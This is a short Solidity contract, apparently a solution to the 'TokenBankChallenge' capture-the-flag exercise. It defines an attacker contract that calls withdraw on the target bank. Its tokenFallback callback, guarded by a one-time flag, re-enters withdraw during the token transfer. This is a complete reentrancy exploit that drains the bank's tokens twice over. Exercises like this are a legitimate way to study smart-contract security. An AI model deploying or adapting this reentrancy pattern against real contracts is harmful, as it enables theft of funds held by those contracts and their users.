pragma solidity 0.4.21;

import "../challenge/TokenBankChallenge.sol";
contract TokenBankChallengeAttacker {
    bool private state;
    function TokenBankChallengeAttacker() public {}

    function attack(address target) external {
        TokenBankChallenge(target).withdraw(500000 * 10**18);
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        if(!state) {
            state = true;
            TokenBankChallenge(from).withdraw(500000 * 10**18);
        }
        
    }
}